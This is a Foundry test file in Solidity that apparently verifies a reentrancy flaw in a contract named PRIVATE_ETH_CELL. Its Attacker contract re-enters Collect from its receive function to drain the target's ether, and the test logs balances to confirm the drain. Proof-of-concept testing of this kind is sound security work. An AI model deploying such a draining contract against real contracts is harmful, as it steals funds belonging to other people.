// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";

contract ReentrancyTest is Test {
    PRIVATE_ETH_CELL privateCell;
    LogFile logFile;
    address user = makeAddr("user");
    uint256 constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        logFile = new LogFile();
        privateCell = new PRIVATE_ETH_CELL();
        privateCell.SetLogFile(address(logFile));
        vm.deal(user, 10 ether);
    }

    function testCollectReentrancyAttack() public {
        // Setup initial conditions
        vm.startPrank(user);
        privateCell.SetMinSum(1 wei);
        privateCell.Deposit{value: DEPOSIT_AMOUNT}();

        assertEq(address(privateCell).balance, DEPOSIT_AMOUNT, "Initial balance incorrect");

        // Deploy attacker contract
        Attacker attacker = new Attacker(privateCell);
        vm.deal(address(attacker), 0); // Ensure attacker starts with 0 balance
        
        console2.log("--- BEFORE-Trigger ---");
        console2.log("Contract balance before attack:", address(privateCell).balance);
        console2.log("Attacker balance before attack:", address(attacker).balance);

        console2.log("--- Trigger Attack ---");
        // Perform attack
        attacker.attack{value: DEPOSIT_AMOUNT}(DEPOSIT_AMOUNT);

        console2.log("--- AFTER-Trigger ---");
        uint256 contractBalanceAfter = address(privateCell).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console2.log("Contract balance after attack:", contractBalanceAfter);
        console2.log("Attacker balance after attack:", attackerBalanceAfter);

        // Differential verification
        console2.log("--- Differential Verification ---");
        bool contractDrained = contractBalanceAfter == 0;
        bool attackerBalanceIncreased = attackerBalanceAfter == 2 * DEPOSIT_AMOUNT;
        
        console2.log("Contract drained (should be 0):", contractBalanceAfter);
        console2.log("Attacker gained 2x deposit (expected: %d, actual: %d)", 
                     2 * DEPOSIT_AMOUNT, attackerBalanceAfter);
        
        // Final verdict
        if (contractDrained && attackerBalanceIncreased) {
            console2.log("Vulnerability Exists: Reentrancy attack successfully drained the contract");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to drain contract or incorrect balance gains");
        }
        vm.stopPrank();
    }
}

contract Attacker {
    PRIVATE_ETH_CELL privateCell;
    uint256 recCount;
    uint256 attackAmount;

    constructor(PRIVATE_ETH_CELL _privateCell) {
        privateCell = _privateCell;
    }

    function attack(uint256 _amount) public payable {
        require(msg.value == _amount, "Incorrect deposit amount");
        attackAmount = _amount;
        privateCell.Deposit{value: msg.value}();
        privateCell.Collect(attackAmount);
    }

    receive() external payable {
        recCount++;
        if (recCount < 10 && address(privateCell).balance >= attackAmount) {
            privateCell.Collect(attackAmount);
        }
    }

    // Fallback to capture any remaining ether
    fallback() external payable {}
}